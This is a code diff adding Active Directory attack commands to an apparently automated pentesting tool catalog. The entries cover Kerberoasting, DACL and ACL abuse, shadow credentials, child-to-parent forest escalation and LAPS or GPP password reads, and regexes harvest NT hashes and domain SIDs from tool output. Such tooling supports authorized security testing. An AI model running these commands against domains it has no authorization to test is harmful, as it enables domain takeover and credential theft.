@@ -570,6 +570,126 @@ CATALOG: list[CommandSpec] = [
                              + ["-v"],
         timeout=300, install_hint="pipx install coercer.",
     ),
+    CommandSpec(
+        name="finddelegation",
+        description="Enumerate Kerberos delegation across the domain: unconstrained, "
+                    "constrained (AllowedToDelegate), and resource-based (RBCD). Needs a "
+                    "domain credential. Flags the accounts abusable for privilege escalation.",
+        binary="impacket-findDelegation", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
+        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}",
+                              "-dc-ip", _s(k["target"])],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="targeted_kerberoast",
+        description="Targeted Kerberoasting: for every account you can write to (from an "
+                    "abusable ACL), temporarily set an SPN, request+roast its ticket, then "
+                    "clean up. Turns GenericAll/GenericWrite over a user into a crackable "
+                    "$krb5tgs$ hash. Needs a domain credential.",
+        binary="targetedKerberoast", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "request_user": {"type": "string", "description": "Roast one specific user (optional)."}},
+            ["target", "domain", "username", "password"]),
+        build_args=lambda k: ["-v", "-d", _s(k["domain"]), "-u", _s(k["username"]),
+                              "-p", _s(k["password"]), "--dc-ip", _s(k["target"])]
+                             + (["--request-user", _s(k["request_user"])] if k.get("request_user") else []),
+        aliases=["targetedKerberoast.py", "targetedKerberoast"],
+        install_hint="pipx install targetedKerberoast.",
+    ),
+    CommandSpec(
+        name="bloodyad",
+        description="Swiss-army AD read/write over LDAP for ACL abuse: enumerate writable "
+                    "objects, add a group member, set a password, grant genericAll, set an "
+                    "owner, or add a shadow credential. Give the action string (default "
+                    "'get writable' — a safe read that finds what your account can abuse).",
+        binary="bloodyAD", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH_H,
+            "action": {"type": "string", "description": "bloodyAD action, e.g. "
+                       "'get writable', 'add groupMember <group> <member>', "
+                       "'set password <user> <newpass>', 'add genericAll <target> <grantee>'."}},
+            ["target", "domain", "username"]),
+        build_args=lambda k: ["--host", _s(k["target"]), "-d", _s(k["domain"]),
+                              "-u", _s(k["username"])]
+                             + (["-p", ":" + _s(k["hash"])] if k.get("hash")
+                                else ["-p", _s(k.get("password", ""))])
+                             + _s(k.get("action", "get writable")).split(),
+        install_hint="pipx install bloodyAD.",
+    ),
+    CommandSpec(
+        name="dacledit",
+        description="Read or write DACLs on an AD object (impacket). Read shows who has "
+                    "rights over a target; write grants a principal FullControl over it "
+                    "(ACL-abuse primitive). Needs a domain credential.",
+        binary="impacket-dacledit", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "principal": {"type": "string", "description": "Principal whose rights to read/grant."},
+            "acl_target": {"type": "string", "description": "Target object the ACL is on."},
+            "acl_action": {"type": "string", "description": "'read' (default) or 'write'."}},
+            ["target", "domain", "username", "password", "acl_target"]),
+        build_args=lambda k: ["-action", _s(k.get("acl_action", "read")),
+                              "-principal", _s(k.get("principal", k["username"])),
+                              "-target", _s(k["acl_target"]), "-dc-ip", _s(k["target"])]
+                             + (["-rights", "FullControl"] if _s(k.get("acl_action", "")) == "write" else [])
+                             + [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
+        aliases=["dacledit.py"], install_hint="pipx install impacket (dacledit fork).",
+    ),
+    CommandSpec(
+        name="certipy_shadow",
+        description="Shadow Credentials attack (msDS-KeyCredentialLink): when you can write "
+                    "to a target account, add a key credential and authenticate as it to "
+                    "recover its NT hash + TGT — no password reset needed. 'auto' adds, "
+                    "authenticates, then removes the key. Needs a domain credential.",
+        binary="certipy-ad", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "account": {"type": "string", "description": "Target account to take over (e.g. a computer$ or user)."}},
+            ["target", "domain", "username", "password", "account"]),
+        build_args=lambda k: ["shadow", "auto", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
+                              "-p", _s(k["password"]), "-account", _s(k["account"]),
+                              "-dc-ip", _s(k["target"]), "-ns", _s(k["target"]), "-dns-tcp"],
+        harvest=[HarvestRule("nthash", r"Got hash for '[^']+':\s*[a-f0-9]{32}:([a-f0-9]{32})")],
+        aliases=["certipy"], install_hint="pipx install certipy-ad.",
+    ),
+    CommandSpec(
+        name="raisechild",
+        description="Automated child-to-parent domain escalation across an intra-forest "
+                    "trust: from Domain Admin in a child domain, dump the child krbtgt and "
+                    "forge an inter-realm ticket with the parent Enterprise Admins SID to "
+                    "reach the forest root. Needs child domain-admin credentials.",
+        binary="impacket-raiseChild", category="ad-smb", host_resolver=host_from_domain,
+        parameters=_params({**_DOMAIN, **_AUTH}, ["domain", "username", "password"]),
+        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="lookupsid",
+        description="Look up the domain SID (and RID-brute users) over MS-LSAT with a "
+                    "credential or null session — the domain SID is needed to forge golden "
+                    "and inter-realm (trust) tickets.",
+        binary="impacket-lookupsid", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "username"]),
+        build_args=lambda k: [f"{_s(k.get('domain',''))}/{_s(k['username'])}:"
+                              f"{_s(k.get('password',''))}@{_s(k['target'])}", "0"],
+        harvest=[HarvestRule("domain_sid", r"Domain SID is:\s*(S-1-5-21-[0-9\-]+)")],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="netexec_module",
+        description="Run a NetExec module against a host: e.g. gpp_password (GPP cpassword), "
+                    "gpp_autologin, laps (read LAPS passwords), enum_trusts (domain trusts), "
+                    "get-desc-users (passwords in the description field), maq "
+                    "(MachineAccountQuota). Give the protocol and module name.",
+        binary="nxc", category="ad-smb",
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
+            "protocol": {"type": "string", "description": "smb or ldap (default smb)."},
+            "module": {"type": "string", "description": "Module name, e.g. gpp_password, laps, enum_trusts."},
+            "module_options": {"type": "string", "description": "Optional -o KEY=VALUE options."}},
+            ["target", "module"]),
+        build_args=lambda k: [_s(k.get("protocol", "smb")), _s(k["target"])] + _nxc_auth(k)
+                             + ["-M", _s(k["module"])]
+                             + (["-o"] + _s(k["module_options"]).split() if k.get("module_options") else []),
+        install_hint="pipx install netexec.",
+    ),
 
     # ---- Credentials -----------------------------------------------------
     CommandSpec(
@@ -735,7 +855,9 @@ _CATEGORIES = {
                "smbmap", "smbclient_shares", "ldapsearch_anon",
                "kerbrute_userenum", "asrep_roast", "kerberoast",
                "add_computer", "rbcd", "get_st", "ticketer",
-               "certipy_find", "certipy_req", "certipy_auth", "coercer",
+               "certipy_find", "certipy_req", "certipy_auth", "certipy_shadow",
+               "coercer", "finddelegation", "targeted_kerberoast", "bloodyad",
+               "dacledit", "raisechild", "lookupsid", "netexec_module",
                "bloodhound_python", "secretsdump"],
     "credentials": ["hydra", "john", "hashcat", "hashid"],
     "exploit": ["searchsploit"],
